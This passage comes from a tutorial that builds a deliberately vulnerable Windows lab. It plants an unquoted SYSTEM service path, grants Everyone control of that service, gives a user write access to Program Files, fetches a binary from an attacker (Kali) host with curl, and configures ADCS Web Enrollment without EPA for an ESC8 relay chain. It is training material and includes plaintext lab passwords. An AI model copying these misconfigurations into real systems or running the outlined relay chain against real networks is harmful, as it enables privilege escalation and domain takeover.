curl http://<KALI_IP>/backup.exe -o "C:\Program Files\Backup Service\backup.exe"
```

The final location of the service binary will be:

```bash
C:\Program Files\Backup Service\backup.exe
```

<img width="889" height="304" alt="image" src="https://github.com/user-attachments/assets/17b2ff7e-d7ac-474f-9a99-cad94a81de24" />


Now that the service executable is ready, we can create the vulnerable Windows service and intentionally introduce the unquoted service path misconfiguration.

The service will run with the default service account:

```text
NT AUTHORITY\SYSTEM
```

This gives the service the highest privileges on the local machine.

We create the service using `sc.exe`:

```bash
sc.exe create BackupService binPath= "C:\Program Files\Backup Service\backup.exe" start= auto
```

The important part here is the `binPath` parameter.

The path contains spaces:

```text
C:\Program Files\Backup Service\backup.exe
```

Normally, Windows expects paths containing spaces to be wrapped in quotation marks:

```text
"C:\Program Files\Backup Service\backup.exe"
```

However, we intentionally leave the path unquoted to reproduce the vulnerability.

Now we verify the service configuration:

```text
sc.exe qc BackupService
```

The output should show:

```text
BINARY_PATH_NAME : C:\Program Files\Backup Service\backup.exe
```

<img width="993" height="345" alt="image" src="https://github.com/user-attachments/assets/74bdabe5-52c2-4e64-b140-bfdb46bce80f" />

Notice that the binary path is missing quotation marks.

The service is now configured incorrectly and ready to be used in the privilege escalation chain.

**Giving svc_backup service restart permissions :**

At this point, the vulnerable service exists, but our low-privileged user still needs permission to interact with it.

By default, normal users cannot control Windows services.

To reproduce the enterprise misconfiguration, the service permissions are intentionally modified to allow any local user to start and stop the backup service.

We modify the service security descriptor:

```cmd
sc.exe sdset BackupService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RPWP;;;WD)"
```

The important entry added at the end is:

```text
(A;;RPWP;;;WD)
```

This gives the `Everyone` group the ability to interact with the service.

Explanation:

```text
WD  → Everyone
RP  → SERVICE_START
WP  → SERVICE_STOP
```

We can verify the updated service permissions:

```cmd
sc.exe sdshow BackupService
```

<img width="1460" height="262" alt="image" src="https://github.com/user-attachments/assets/10f9b8d5-77ef-415b-b77c-5901bcb29041" />

The output should now contain:

```text
(A;;RPWP;;;WD)
```

**Grant Svc_backup Write Acess:**

Our user should have write access on the Program Files folder so that we can add our malicious Backup.exe there . 

```powershell
takeown /F "C:\Program Files"
icacls "C:\Program Files" /grant "svc_backup:(M)"
```

<img width="970" height="501" alt="image" src="https://github.com/user-attachments/assets/9f74a712-e1ce-4aad-a0c5-f0aa26200799" />

We see that we now have (M) which is Modify permissions .

At this point, the service is fully prepared for exploitation.

Now Box 5 is done . Let's move on to Box 6 . 


### Box 6 : DC01 : 

#### ISO Installation : 

For this one we will need a Windows Server 2019 , Microsoft offers free trial for 180 days that we can use , simply navigate to : 

```bash
http://microsoft.com/fr-fr/evalcenter/download-windows-server-2019
```

<img width="1629" height="785" alt="image" src="https://github.com/user-attachments/assets/7c6a0b35-88af-4818-8390-2dd0e5a4bd16" />

I will install the English version . 

Once the Installation is completed , Create a new VM : 

- CPU: 2 vCPUs minimum (4 if your machine can handle it).
- RAM: 4 GB minimum, 8 GB recommended.
- Disk: 60–80 GB.
- Network adapter: NAT for now .

<img width="880" height="475" alt="image" src="https://github.com/user-attachments/assets/c17d6ca4-7f28-45cb-be30-fa8138821e57" />

Then : 

<img width="723" height="487" alt="image" src="https://github.com/user-attachments/assets/90d2315e-cd5c-46bb-89bd-6a9740694573" />

We will install the ISO later : 

<img width="784" height="514" alt="image" src="https://github.com/user-attachments/assets/c71d6d2f-7ea0-48a6-a17c-32a1b31ff640" />

Then we select Windows Server 2019 :

<img width="860" height="375" alt="image" src="https://github.com/user-attachments/assets/b55c6c7e-ffad-4882-be51-42521870797d" />

For the name , we named it DC01 : 

<img width="889" height="507" alt="image" src="https://github.com/user-attachments/assets/9318bc3a-eac0-4bbe-a402-b8a553af27f1" />

Select UEFI , we don't need Secure Boot for this one : 

<img width="904" height="523" alt="image" src="https://github.com/user-attachments/assets/69c90a94-3502-48a1-ab9b-2ca26d1b89b2" />

For the Processor config : 

<img width="917" height="497" alt="image" src="https://github.com/user-attachments/assets/25a4528b-bdf4-4237-a1db-b23ae3704d26" />

For RAM i gave it around 6GB but 4 will work just fine : 

<img width="1058" height="524" alt="image" src="https://github.com/user-attachments/assets/54e2d460-b7c2-4535-9ea6-542301f9d57a" />

For Network we're using NAT for now , we will modify it later once we install everything we need . 

<img width="872" height="549" alt="image" src="https://github.com/user-attachments/assets/a4af6bb9-59ac-455f-b0ad-40063c7fc911" />

For the Logic Type :

<img width="1049" height="550" alt="image" src="https://github.com/user-attachments/assets/7c9e44c6-3639-4e9d-a808-61765d7a3d1c" />

For the Disk type we will choose the recommended one : 

<img width="930" height="515" alt="image" src="https://github.com/user-attachments/assets/0fd2ceae-a1f9-4c1b-9b73-9fb0755e8078" />

For the disk , we choose to create a new disk : 

<img width="811" height="511" alt="image" src="https://github.com/user-attachments/assets/0a1968f1-dd34-484e-8d65-754bd045c956" />

Then we store everything in a single file : 

<img width="1070" height="536" alt="image" src="https://github.com/user-attachments/assets/3a97e740-9b56-44b5-a9ae-e61109ce9ea5" />

For the disk file we will leave it as it is :

<img width="825" height="521" alt="image" src="https://github.com/user-attachments/assets/229dd97e-b835-4fb9-af47-314e2ff55aff" />

Then we click Finish : 

<img width="880" height="524" alt="image" src="https://github.com/user-attachments/assets/6635f630-99c9-41ac-b49e-d84a6461638c" />

Once the VM is created , we will edit the VM : 

<img width="1623" height="649" alt="image" src="https://github.com/user-attachments/assets/ca90a54a-ede3-4deb-b267-066381b5efdb" />

We then choose our ISO file that we just downloaded : 

Then we start the machine : 

<img width="1094" height="322" alt="image" src="https://github.com/user-attachments/assets/87bc751b-2335-4962-bc67-a3997f4f1e9a" />

We just wait : 

<img width="1111" height="623" alt="image" src="https://github.com/user-attachments/assets/9046f291-17c4-46ed-b2aa-7b4aa9b69d3f" />

Finally we start the Installation : 

<img width="1049" height="551" alt="image" src="https://github.com/user-attachments/assets/a50f5f6f-3011-43ee-a6c6-bd8bac81b4b9" />

We select the Windows Server Desktop Experience :

<img width="1045" height="585" alt="image" src="https://github.com/user-attachments/assets/99381512-a59d-4815-85d1-ee30d49b08b7" />

Just agree to the terms and services : 

<img width="999" height="563" alt="image" src="https://github.com/user-attachments/assets/c9ad04e4-3083-4794-b11a-d7d7d927674c" />

For the Installation we choose the Custom one :

<img width="1164" height="590" alt="image" src="https://github.com/user-attachments/assets/2ca0abc9-3be1-4579-9a3a-e4166cc11a91" />

From there we choose the Drive we specified earlier : 

<img width="965" height="580" alt="image" src="https://github.com/user-attachments/assets/5f0878f7-df8d-4df2-bb01-25a70c23fae0" />

From there we just wait : 

<img width="1467" height="755" alt="image" src="https://github.com/user-attachments/assets/296aff7d-9ae3-412d-a19b-89769f616445" />

Once the Insatallation is finished , we will need to create a password for our Administrator account : 

```text
Password@123456789
```

<img width="1375" height="701" alt="image" src="https://github.com/user-attachments/assets/fefa8399-235f-4d2d-87b8-531f31851111" />

From there , our VM is fully Setup : 

<img width="1464" height="784" alt="image" src="https://github.com/user-attachments/assets/698a31cd-4de5-4219-a1da-db3db3ce43d0" />

Now we need to Promote it to a Domain Controller , but that's for the next section : 


#### Scenario : 

##### Attack Chain : 

**Install Active Directory Domain Services :** 

First , open Server Manager .

Then go to Manage --> Add Roles And Features : 

<img width="1361" height="821" alt="image" src="https://github.com/user-attachments/assets/b0b0ee6f-e753-44c1-8a7c-5602ab058b9f" />

Select *Role-based or feature-based installation* : 

<img width="1295" height="830" alt="image" src="https://github.com/user-attachments/assets/700ee0ab-ce2a-4b74-a2d6-8cfe12d2fe58" />

Then we choose our Server : 

<img width="1354" height="838" alt="image" src="https://github.com/user-attachments/assets/3660ed44-1ed6-4216-8b18-fefa03cc8ce3" />

Select Active Directory Domain Services :

<img width="1178" height="680" alt="image" src="https://github.com/user-attachments/assets/6d628857-d3ff-4d7b-beff-2357a510757a" />

Then add Feature : 

<img width="1273" height="853" alt="image" src="https://github.com/user-attachments/assets/86e07e34-fbd9-4433-b0c4-ddd6bf425427" />

We don't need other features , so we just click Next : 

<img width="1261" height="856" alt="image" src="https://github.com/user-attachments/assets/c27fe2db-d18e-4c23-be36-646a01463aef" />

For this one we just click Next :

<img width="1213" height="820" alt="image" src="https://github.com/user-attachments/assets/3d5598cf-18aa-464e-b30b-cc7958082f88" />

Finally we click Install , I also checked the Reset machine if required :

<img width="1250" height="822" alt="image" src="https://github.com/user-attachments/assets/660ffcd4-6c06-4d87-b74b-0ed72e9bf327" />

Once done we just close everything :

<img width="1249" height="843" alt="image" src="https://github.com/user-attachments/assets/41372fb3-3aa4-48be-8837-e25ca5e40a07" />

Once the Installation is done , we should see a yellow notification flag :

<img width="1258" height="828" alt="image" src="https://github.com/user-attachments/assets/5fe59d45-bc2d-463c-91fa-9dc9451aea38" />

Just Click Promote this server to a Domain Controller : 

We then Select Add a New Forest and we name it Isolate.local . 

<img width="1423" height="819" alt="image" src="https://github.com/user-attachments/assets/4fe34550-1cda-47e2-aeef-60fa9e8a29d0" />

For the Domain Controller Options , Select Windows Server 2016 for both , then enable DNS Server and Global Catalog , and finally set the DSRM Password : 

```text
P@123456789#
``` 

*Quick Note : DSRM is a special boot mode used to repair or restore Active Directory when the domain controller cannot start normally.*

<img width="1186" height="770" alt="image" src="https://github.com/user-attachments/assets/2a67b50b-f57c-4f4c-9d31-9953335749d0" />

For DNS Delegation , we just ignore the Warning : 

<img width="1230" height="813" alt="image" src="https://github.com/user-attachments/assets/4b7125b2-4606-421f-9546-afadf9389b82" />

For the Netbios , no modifications needed : 

<img width="1246" height="811" alt="image" src="https://github.com/user-attachments/assets/721ad2ec-3b02-485a-8498-788faba605e5" />

For the Paths , we keep the default ones : 

<img width="1260" height="846" alt="image" src="https://github.com/user-attachments/assets/2f17968d-6edd-41e7-9f2e-dd1b60ccb997" />

Review Options We just leave the default settings : 

<img width="1207" height="804" alt="image" src="https://github.com/user-attachments/assets/dd6df9ee-ce56-4a61-8f07-1df22794d276" />

For now we can ignore the Prerequesits checks and start the Insatallation :  

<img width="1332" height="844" alt="image" src="https://github.com/user-attachments/assets/60edeb94-0ba8-41ec-9d40-d6095675d135" />

Once the Installation is completed it will Restart automatically :


**Verify Domain Controller :**

After promotion, your machine is no longer a standalone Windows server. It becomes the root of identity and authentication for your lab.

- Login changes

<img width="1271" height="765" alt="image" src="https://github.com/user-attachments/assets/ba8e1301-e35e-4a8b-a6c5-b5ca9276dd3e" />

Before we had : 

```text
DC\Administrator
```

It means we are using the local Administrator account stored on this machine.

After promotion:

```text
Isolate\Administrator
```

This means We are authenticating against Active Directory in the Isolate domain.

Technically:

- Local accounts live in the SAM database
- Domain accounts live in Active Directory (NTDS.dit)

The Domain Controller becomes the authority for:
- Users
- Computers
- Groups
- Kerberos tickets
- LDAP queries
- Group Policy

Now to verify further , Open Powershell : 

```powershell
Get-ADDomain
```

This queries Active Directory through the PowerShell AD module.

It confirms:

- Domain exists
- AD DS is working
- Correct DNS namespace

<img width="1232" height="633" alt="image" src="https://github.com/user-attachments/assets/83d94510-7b21-4a6f-8ad2-efaa4726359e" />

The most important component for us is DNS : 

```powershell
Get-Service DNS
```

<img width="1003" height="300" alt="image" src="https://github.com/user-attachments/assets/8824ec85-7e64-4e8e-9edb-9b2cac620d2a" />

A Domain Controller normally runs DNS because AD uses DNS for:

- Domain discovery
- Kerberos service location
- LDAP discovery
- Replication

**Create Low Privilege Domain User :**

To keep things simple we will keep the same user from Box 5 : 

```bash
svc_backup : "Backup@123"
```

*Quick Note* : 

To enable Copy paste : 

- VM menu → Manage → Install VMware Tools...
- Inside the VM , Open Powershell :

```powershell
D:\setup.exe
```
- Follow the Installation guide .
- Reboot the Machine .
- Shut down the VM
- VM → Settings → Options tab → Guest Isolation
- Check Enable copy and paste
- (Optional) Check Enable drag and drop

<img width="1416" height="476" alt="image" src="https://github.com/user-attachments/assets/e592e362-c566-4062-aeac-0cebc2f86390" />

Now back to the Scenario . 

We can create our user via Powershell : 

```powershell
New-ADUser `
-Name "svc_backup" `
-SamAccountName "svc_backup" `
-UserPrincipalName "svc_backup@Isolate.local" `
-AccountPassword (ConvertTo-SecureString "Backup@123" -AsPlainText -Force) `
-Enabled $true `
-PasswordNeverExpires $true
```

Then we verify : 

```powershell
Get-ADUser svc_backup
```

<img width="1205" height="501" alt="image" src="https://github.com/user-attachments/assets/ffbfa036-b2cf-44c5-91e7-8b1575d968bb" />

Now we can verify that our user can authenticate against Active Directory and perform LDAP queries.

First, we provide the credentials of our domain user:

```powershell
$cred = Get-Credential
```

<img width="1061" height="512" alt="image" src="https://github.com/user-attachments/assets/8d86ad88-b911-4d8d-8e4c-b335f9f2fc18" />

These credentials will be used by PowerShell when communicating with the Domain Controller.

Next, we use them to query Active Directory:

```powershell
Get-ADUser svc_backup -Credential $cred
```

<img width="1030" height="459" alt="image" src="https://github.com/user-attachments/assets/05abbaa1-be65-45ff-822f-c41be264473f" />

This command performs an LDAP query against Active Directory using the supplied credentials.

The query succeeds, which confirms that:

- The svc_backup account exists in the domain.
- The password is valid.
- The account is able to authenticate against the Domain Controller.
- The account can perform LDAP queries as a normal domain user.

*Important distinction*

This does not mean the user can log in interactively to the Domain Controller.

For example, attempting:

```powershell
runas /user:Isolate\svc_backup cmd
```

tries to create an interactive logon session on the Domain Controller.

<img width="998" height="304" alt="image" src="https://github.com/user-attachments/assets/888111de-51dd-4b88-a66d-dab8dfc1d880" />

Because this server is a Domain Controller, interactive logon rights are restricted through Windows security policies. Regular domain users are typically not allowed to open a local command session on the DC unless they have been granted the appropriate user rights.

Therefore, the runas failure does not indicate that the credentials are invalid. It only shows that this account is not allowed to obtain an interactive logon session on the Domain Controller.

For our ESC8 scenario, this is expected behavior. The account only needs valid domain authentication, not an interactive shell on the DC.


#### Important Note : 

The steps below install ADCS directly on the DC itself. This is worth doing once for practice, since it's the simplest way to see how the Certification Authority and Web Enrollment roles are configured but it won't work for the actual **attack phase**, and it's worth understanding why before moving on.

ESC8 works by coercing a machine into authenticating, then relaying that authentication to a CA's Web Enrollment endpoint to request a certificate on its behalf. If the CA is installed on the DC itself, the machine being coerced (DC01$) and the machine receiving the relayed authentication (also DC01) end up being the exact same box. Windows blocks this outright a built-in anti-reflection check in the NTLM authentication layer (msv1_0) detects when a machine's own authentication is being relayed back to itself and rejects it, regardless of protocol, signing settings, or EPA configuration. There's no toggle to disable this, it's a hard block by design.

This is also why, in real-world Active Directory deployments, ADCS should never be installed on a Domain Controller in the first place — beyond the relay issue, it unnecessarily expands the DC's attack surface for something that has no need to live there.

So for the attack path, we'll stand up a separate CA server a plain domain-joined member server, not a second DC and relay the coerced DC01$ authentication to that box instead. Two distinct machines on either end of the relay, no reflection block, and a setup that mirrors how ESC8 actually plays out against real environments.


##### Optional  : 


**Install ADCS (Active Directory Certificate Services) :**

Now we need to set up our ADCS . 

The goal is to create the certificate infrastructure that ESC8 abuses.

The attack path should look like this : 

```text
svc_backup credentials
          |
          v
PetitPotam or PrinSpooler coerces DC authentication
          |
          v
NTLM relay
          |
          v
ADCS Web Enrollment (/certsrv)
          |
          v
Certificate for DC machine account
```

First we Install the ADCS role :

Open Server Manager -->   Manage --> Add Roles and Features --> Active Directory Certificate Services 

<img width="1483" height="787" alt="image" src="https://github.com/user-attachments/assets/d2aa1451-2693-44df-919c-00905f4c3d46" />

Then we Install both : 

Certification Authority And Certificate Authority Web Enrollment

<img width="1201" height="616" alt="image" src="https://github.com/user-attachments/assets/ef38e7b4-c77b-446d-83ac-9110f49e7f94" />

Why do we need both ? 

- *Certification Authority (CA)*

This is the certificate issuer.

Think:

```text
Computer/User --> Certificate Request --> Enterprise CA --> Certificate issued
```

*Certificate Authority Web Enrollment*

This creates:

```text
http://DC/certsrv
```

This is the vulnerable web interface used in ESC8. 

Without Web Enrollment:
- No /certsrv endpoint
- No NTLM relay target
- No ESC8

For Select Role services , keep the default ones : 

<img width="988" height="578" alt="image" src="https://github.com/user-attachments/assets/c836a4e8-d9a2-438f-8cf3-24c0bf821f83" />

And we just start the Installation : 

<img width="1093" height="609" alt="image" src="https://github.com/user-attachments/assets/1ca41fa4-33c4-4365-af23-2788ed92cde8" />


**Configure ADCS :**

Once the Installation is done , Server Manager will show: "Configure Active Directory Certificate Services" .

<img width="1179" height="733" alt="image" src="https://github.com/user-attachments/assets/35dc723e-b71f-454b-8ab9-e28a196f124c" />

Click it and choose : 

```text
Certification Authority
Certificate Authority Web Enrollment
```

<img width="1145" height="697" alt="image" src="https://github.com/user-attachments/assets/1f80170a-cecf-473f-bf51-79c2ddda9739" />

Then for the Setup we select Enterprise CA because this integrates with AD.

<img width="1128" height="603" alt="image" src="https://github.com/user-attachments/assets/591f0e7e-eda5-4d72-b0e9-c418b059a66d" />

CA type , we will choose Root CA because this is our first CA.

<img width="1007" height="585" alt="image" src="https://github.com/user-attachments/assets/f9e14a9a-f222-49f7-966b-11fdfd1f54f4" />

Then we create a new Private Key : 

<img width="1024" height="646" alt="image" src="https://github.com/user-attachments/assets/994fc856-4b41-474f-a6b3-6dca8d42ca52" />

The defaults are fine : 

```text
RSA
2048 bits
SHA256
```

<img width="1054" height="612" alt="image" src="https://github.com/user-attachments/assets/e718a515-58fd-4711-b539-f0f01b7e2bb0" />

Then for name "ISOLATE-DC-CA" .

<img width="935" height="596" alt="image" src="https://github.com/user-attachments/assets/33f624de-18c6-447e-9ab4-5966375df13b" />

And for Validity we'll keep the default which is 5 years : 

<img width="1088" height="652" alt="image" src="https://github.com/user-attachments/assets/c173eddf-6f6d-49e8-8f02-5427432c14bc" />

For the DB , default as well : 

<img width="1003" height="656" alt="image" src="https://github.com/user-attachments/assets/b605d347-3a75-4852-916a-4664be72b72c" />

Then finally we start the configuration : 

<img width="923" height="627" alt="image" src="https://github.com/user-attachments/assets/39eb270b-4837-4cd4-9c83-99d6d1d09c87" />

Once done : 

<img width="1060" height="652" alt="image" src="https://github.com/user-attachments/assets/05a8f504-2ab2-436d-9074-327c992bf9ce" />

We can verify it by going to : 

Tools --> Certificate Authority :

<img width="1094" height="340" alt="image" src="https://github.com/user-attachments/assets/00d4053a-354f-494c-be0a-6c9c403d1c0b" />

And we should find our new CA :

<img width="1053" height="417" alt="image" src="https://github.com/user-attachments/assets/53d0da73-4955-4933-93cc-e097a5f81d09" />

Seeing the CA here confirms that:

- The Certificate Authority service (CertSvc) is installed.
- The CA is registered inside Active Directory.
- The CA database has been initialized.
- The CA is ready to issue certificates to domain users and computers.

The current architecture is now:

```text
                 Active Directory Domain
                         |
                         |
                  Enterprise CA
                         |
                         |
                  ISOLATE-DC-CA
                         |
          +--------------+--------------+
          |
          |
    Certificate Templates
          |
          |
    Domain Users / Computers
```

At this stage, the CA exists, but we still need to verify the Web Enrollment component because ESC8 specifically targets the HTTP enrollment interface.

**Step 1 — Verify /certsrv**

On the DC, open a browser:

```text
http://localhost/certsrv
```

<img width="1467" height="634" alt="image" src="https://github.com/user-attachments/assets/9701d4c2-7657-46ba-90cd-c2ecede6d7d3" />

Perfect this confirms that Web Enrollment is working . 

**Step 2 — Verify IIS Authentication**

Open IIS Manager

Navigate to : 

```text
Sites --> Default Web Site --> certsrv --> Authentication
```

<img width="1550" height="652" alt="image" src="https://github.com/user-attachments/assets/86397287-26e7-4f7e-bf43-a0da9ce46b50" />

Check:

```text
Windows Authentication     Enabled
Anonymous Authentication   Disabled
```

The reason is ESC8 relies on NTLM authentication being accepted by the Web Enrollment endpoint.

<img width="1250" height="532" alt="image" src="https://github.com/user-attachments/assets/7c11f739-e8c8-46e9-ae1f-355ecf474fe2" />

Perfect everything is set , now onto step 3 .

**Step 3 — Check EPA**

Still in:

```text
Windows Authentication --> Advanced Settings
```
<img width="1500" height="535" alt="image" src="https://github.com/user-attachments/assets/ccdc382d-1d9c-4dd7-bbd7-7a9f313a6c14" />

Check Extended Protection, For our vulnerable lab:

**Off** or Accept NOT Require

<img width="1199" height="539" alt="image" src="https://github.com/user-attachments/assets/71117ff9-0950-4a78-9dbb-724baa1cbc40" />

These are the steps to set up a CA on the same machine as the DC as covered above, unless we had a way to defeat the reflection protection itself, this setup can't be abused for ESC8. It's here purely for completeness/practice.


##### CA01 : Setting up the ADCS for the lab  : 

First we will set up a new Windows Server , the same Steps as we did with the DC01 will be done to create the VM :

<img width="1079" height="633" alt="image" src="https://github.com/user-attachments/assets/7c43038e-3ad3-4022-b61c-ac72593cc790" />

For the Administrator Password : 

```text
Password.123456789
```

Now first we will remove the Old CA we had , since Having two CAs in the same AD forest can cause template conflicts (e.g., both trying to publish the same certificate templates to AD, or clashing on the DomainController template enrollment), which could make your new CA01 setup behave unpredictably or make it unclear later which CA actually issued/served a given cert during ESC8.

Now back to our DC01 :

```bash
Server Manager → Remove Roles and Features → uncheck Active Directory Certificate Services
```

<img width="1171" height="722" alt="image" src="https://github.com/user-attachments/assets/58988fd4-eb9a-4400-98b6-820d5701fcee" />

We should get this warning , which just means that we need to first uncheck Web Enrollment first , then comeback and uncheck the Certificate Authority :

<img width="989" height="628" alt="image" src="https://github.com/user-attachments/assets/98a18542-e133-4ddf-85ba-27149893173e" />

Done , now we go back to 

```text
Server Manager → Remove Roles and Features → uncheck Active Directory Certificate Services
```

<img width="1785" height="714" alt="image" src="https://github.com/user-attachments/assets/63e9dd6e-cc40-439c-bd17-3ca175d166b3" />

We just click Next and Finally Remove : 

<img width="1513" height="709" alt="image" src="https://github.com/user-attachments/assets/db419535-a6f3-490f-8226-0d5b7ea5cf46" />

Now we restart the DC01 : 

To confirm no ADCS is in place : 

```bash
Get-WindowsFeature ADCS*
certutil -CAInfo
```

<img width="1136" height="455" alt="image" src="https://github.com/user-attachments/assets/154df577-18de-41dc-9cbb-b2ecfec389a8" />

If this errors out saying no CA is configured, clean. If it still returns CA details, there's a stale entry.

Now we can move to the CA01 machine . This time configuring the DNS , and joining the machine to the domain will be done via command line : 

First we need to get the NAT Ip address for the DC01 :

<img width="656" height="361" alt="image" src="https://github.com/user-attachments/assets/524da5f2-b824-4d8a-9b51-89a85c122a3c" />

DC01 IP : '192.168.32.151' . 

```powershell
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 192.168.32.151
```

<img width="1045" height="344" alt="image" src="https://github.com/user-attachments/assets/c1499192-65dd-4401-bf88-17e31cc77319" />

Now that the DNS is the DC01 , we can join the machine to the domain :

```powershell
Add-Computer -DomainName "Isolate.local" -Credential (Get-Credential) -Restart
```

This will prompt for domain admin creds, then restart the box.

<img width="1295" height="616" alt="image" src="https://github.com/user-attachments/assets/d04d8771-65fb-4247-8c53-9035f35ab4b6" />

For the credentials :

<img width="551" height="255" alt="image" src="https://github.com/user-attachments/assets/5eeb8e4c-b509-4c31-abe1-574d82daf237" />

We need to enter the DC01 Administrator account that we set earlier when creating the DC01 : 

```text
Isolate\Administrator : Password@123456789
```

If the credentials were correct, the command executes silently and the machine restarts automatically. Once it boots back up, click "Other user" and you should see that it mentions the ISOLATE Domain now : 

<img width="1357" height="735" alt="image" src="https://github.com/user-attachments/assets/cd7d89cf-db64-47eb-a04f-263060397174" />

Now we just login with our CA01 machine using the local Administrator account : 

We can also confirm the Domain join via Powershell : 

```powershell
Get-ComputerInfo | Select CsDomain, CsDomainRole
```

<img width="821" height="361" alt="image" src="https://github.com/user-attachments/assets/607be495-a9b4-4428-802a-373d86f61e3d" />

We then change the Hostname to match CA01 :

```bash
Rename-Computer -NewName "CA01" -DomainCredential (Get-Credential) -Restart
```

Changing the Hostname of a domain joined machine requires domain authentication , so we need to specify the creds for the Domain Admin : 

```text
Isolate\Administrator : Password@123456789
```

Now we just Install both Web Enrollment and ADCS Role on the CA01 via Powershell :

```powershell
Install-WindowsFeature ADCS-Cert-Authority, ADCS-Web-Enrollment -IncludeManagementTools
```

<img width="1763" height="374" alt="image" src="https://github.com/user-attachments/assets/98042da6-8191-45d9-beb4-0984e32522f9" />

Once done : 

<img width="973" height="381" alt="image" src="https://github.com/user-attachments/assets/1d438483-e56f-4c8a-b339-3d62975422ec" />

Now we open the Service Manager , and we should see a yellow flag again , this means we should complete the ADCS setup : 

<img width="1229" height="646" alt="image" src="https://github.com/user-attachments/assets/b7c1cec1-88ea-4222-a47d-574e6e9a9f8d" />

Now for the Confiugration : 

- Credentials : use Isolate\Administrator (domain admin), since Enterprise CA setup requires Enterprise Admins group membership, not local admin rights.

<img width="963" height="586" alt="image" src="https://github.com/user-attachments/assets/2c7c44ab-644c-43eb-8d35-a0ed35fa53dc" />

- Role Services : check Certification Authority and Certification Authority Web Enrollment (the latter is what exposes the /certsrv/ HTTP interface ESC8 targets).

<img width="1102" height="591" alt="image" src="https://github.com/user-attachments/assets/c9ae6b67-5615-4a91-ad65-7217d05421b9" />

- Setup Type : Enterprise CA, since it needs AD integration to read/issue against AD-based templates like DomainController.

<img width="997" height="594" alt="image" src="https://github.com/user-attachments/assets/ae1f8ec3-b5ec-4f5a-a788-bad96a38fc2b" />

- CA Type : Root CA, since this is the only CA in the lab's PKI hierarchy.

<img width="973" height="568" alt="image" src="https://github.com/user-attachments/assets/25d80e70-f1c4-470d-8455-fc65af77e65c" />

- Private Key : Create a new private key (default).

<img width="916" height="536" alt="image" src="https://github.com/user-attachments/assets/32ce5b5e-dc89-4a06-aed6-6b866509e6aa" />

- Cryptography : defaults (RSA, 2048-bit, SHA256) are fine for a lab

<img width="974" height="435" alt="image" src="https://github.com/user-attachments/assets/8c0c18c9-c105-49e1-a2e4-6f7ef6f0d975" />

- CA Name : leave the auto-generated Common Name/DN as-is; nothing here needs customizing.

<img width="865" height="430" alt="image" src="https://github.com/user-attachments/assets/b20857fa-bc41-4521-aaf6-8acdadba703d" />

- Validity Period : default (5 years).

<img width="905" height="549" alt="image" src="https://github.com/user-attachments/assets/cc602ff2-9ae2-4fab-8c34-ead9206678a1" />

- Certificate Database : default paths.

<img width="894" height="578" alt="image" src="https://github.com/user-attachments/assets/54122e8b-24a0-497f-98ff-1bee96c84461" />

- Confirmation → click Configure.

<img width="981" height="652" alt="image" src="https://github.com/user-attachments/assets/34a4506c-824a-4849-b1ee-f48bff25a8e9" />

Once done : 

<img width="1099" height="650" alt="image" src="https://github.com/user-attachments/assets/3460d17e-05ea-490e-a745-244b1c7ff10c" />

We just reset the machine .

Then we log in as the Domain Administrator not the Local Administrator : 

```bash
Isolate\Administrator : Password@123456789
```

From there we test if the CA was created successfully : 

```bash
certutil -CAInfo
certutil -CATemplates
```

<img width="977" height="753" alt="image" src="https://github.com/user-attachments/assets/222e2f8d-6199-4760-b0fc-a268814333aa" />

Everything is set : 

**Establishing CA Trust for PKINIT Authentication :**

Just One last thing : Before the attack can work, the DC needs to explicitly trust the CA's certificate for Kerberos certificate-based (PKINIT) authentication.

After the wizard completes, one additional step is required before the CA can be used for PKINIT-based authentication (which ESC8 relies on). The DC needs to explicitly trust this CA for certificate-based logon — this is controlled by the NTAuthCertificates object in AD's Configuration partition.

While an Enterprise Root CA is supposed to auto-publish itself there during install, this doesn't always propagate to the DC immediately. To ensure it's in place, export the CA certificate from CA01 and manually add it to the DC's NTAuth store:

On CA01:

```powershell
certutil -ca.cert C:\ca01.cer
```

Transfer ca01.cer to DC01, then on DC01:

```powershell
certutil -enterprise -addstore NTAuth C:\ca01.cer
certutil -pulse
gpupdate /force
```

Verify it landed:

```powershell
certutil -viewstore -enterprise NTAuth
```

The CA01 certificate should now appear in the output. Without this step, Certipy's PKINIT authentication will fail with KDC_ERROR_CLIENT_NOT_TRUSTED even if the relay and certificate issuance worked perfectly.

Now we've configured everything in the NAT Network , we need to setup the Internal Network now and ensure the connectivity .



### Networking : 

#### Creating the NIC : 

Before we touch a single box, we need to get the network right. We don't want a flat network where Kali can just spray the whole subnet and reach the Domain Controller directly. That's not how a real engagement looks , and it defeats the point.

Instead we're going to build two segments , much like a real-world DMZ sitting in front of an internal corporate network :

- A Public segment , where our Kali attacking machine lives alongside the only internet-facing box (WEB01). This is our entry point.
- An Internal segment , a fully isolated network holding the rest of the Linux boxes and the Windows side (Rogue + DC01). Nothing here can reach the internet , and nothing on the outside can reach it directly.

The only thing bridging those two worlds is WEB01 , which sits with one foot in each network (a dual-homed host). Once we get our foothold on it , we'll drop a Ligolo-ng agent there and use it as a pivot to tunnel into the internal segment. Until then , the internal boxes are completely dark from Kali's point of view , exactly like they should be.

```text

                 Internet
                    |
              [ NAT / VMnet8 ]        <-- Public segment (192.168.153.0/24)
                 |        |
              Kali      WEB01  ( eth0 : NAT )
                          |
                          | ( eth1 : Internal )   <-- the pivot
                          |
        ======[ LAN Segment : internal ]======   <-- Internal segment (10.10.10.0/24)
          |         |          |         |
     Dirty2Geddon  Backup    ORNN     Rogue --- DC01
       (Box 2)    (Box 3)  (Box 4)   (Win10)  (Server 2019)

```

First we need to add the Network Interface , for this one open VMWare then go to Edit --> Virutal Network Editor : 

<img width="1059" height="518" alt="image" src="https://github.com/user-attachments/assets/04eeb280-0cef-46e4-8edb-a9a7614419f6" />

From there click Change Settings , accept the UAC popup , then we can add a New Network : 

<img width="824" height="619" alt="image" src="https://github.com/user-attachments/assets/a1ff022a-a74a-4aef-a627-af2476c190ad" />

Select Host Only , since we want a private Network that isn't connected to the internet : 

<img width="950" height="592" alt="image" src="https://github.com/user-attachments/assets/ebc93301-94ef-496d-9106-6f2432b60b54" />

Our Subnet IP is 10.10.10.0 and for the Subnet Mask it's 255.255.255.0 since we want /24 for this lab . 

We don't need automatic DHCP to be enabled . 

Leave Connect host virtual adapter to this network unchecked since we don't want the VMs to be accessible , not even from my Host machine .

It will by default name it VMnet0 or 4 or whatever number you specified , we can then rename it to Internal and hit apply . 

